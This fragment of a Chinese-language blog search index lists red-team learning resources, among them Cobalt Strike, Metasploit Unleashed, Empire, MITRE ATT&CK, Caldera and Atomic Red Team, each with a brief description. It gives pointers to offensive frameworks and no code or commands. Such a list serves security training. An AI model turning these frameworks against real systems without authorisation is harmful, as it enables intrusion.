-<h4 id="4-特定工具與框架學習資源"><a href="#4-特定工具與框架學習資源" class="headerlink" title="4. 特定工具與框架學習資源"></a><strong>4. 特定工具與框架學習資源</strong></h4><h5 id="1-Cobalt-Strike-Documentation"><a href="#1-Cobalt-Strike-Documentation" class="headerlink" title="(1) Cobalt Strike Documentation"></a><strong>(1) <a class="link"   href="https://www.cobaltstrike.com/support/user-manuals" >Cobalt Strike Documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供詳細的 Cobalt Strike 使用指南，特別是 Aggressor Scripts 的編寫與應用教學。這幫助學習者了解攻擊腳本的開發流程，並結合現有工具實現任務的自動化腳本設計。</p>
-<h5 id="2-Metasploit-Unleashed"><a href="#2-Metasploit-Unleashed" class="headerlink" title="(2) Metasploit Unleashed"></a><strong>(2) <a class="link"   href="https://www.offensive-security.com/metasploit-unleashed/" >Metasploit Unleashed<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Metasploit 的官方教學，涵蓋腳本模組的開發與應用。學習者可以透過這些內容掌握如何根據需求設計自定義攻擊腳本，以及熟悉 Metasploit 框架的腳本化操作流程。</p>
-<h5 id="3-MITRE-ATT-CK-Framework"><a href="#3-MITRE-ATT-CK-Framework" class="headerlink" title="(3) MITRE ATT&amp;CK Framework"></a><strong>(3) <a class="link"   href="https://attack.mitre.org/" >MITRE ATT&amp;CK Framework<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供標準化的攻擊技術與場景資料庫，幫助學習者模擬 ATT&amp;CK 技術腳本的實現，並設計符合紅隊演練場景的攻擊腳本。</p>
-<h5 id="4-Empire"><a href="#4-Empire" class="headerlink" title="(4) Empire"></a><strong>(4) <a class="link"   href="https://github.com/BC-SECURITY/Empire" >Empire<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Empire 是一個強大的後滲透測試框架，支持腳本化的滲透測試活動，適合進行模擬攻擊與自動化操作。</p>
-<h5 id="5-MITRE-Caldera"><a href="#5-MITRE-Caldera" class="headerlink" title="(5) MITRE Caldera"></a><strong>(5) <a class="link"   href="https://caldera.mitre.org/" >MITRE Caldera<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>MITRE Caldera 是一個自動化紅隊模擬框架，專注於模擬真實的攻擊行為，幫助學習者測試與了解各種攻擊技術。適合用於模擬企業場域的攻擊活動。</p>
-<h5 id="6-Atomic-Red-Team"><a href="#6-Atomic-Red-Team" class="headerlink" title="(6) Atomic Red Team"></a><strong>(6) <a class="link"   href="https://github.com/redcanaryco/atomic-red-team" >Atomic Red Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Atomic Red Team 提供一組開放式的攻擊技術測試框架，幫助學習者快速測試與模擬常見的攻擊技巧，並結合 MITRE ATT&amp;CK 進行實踐。</p>
-<ul>
-<li><a class="link"   href="https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist/" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>other</tag>
       </tags>
   </entry>
 </search>
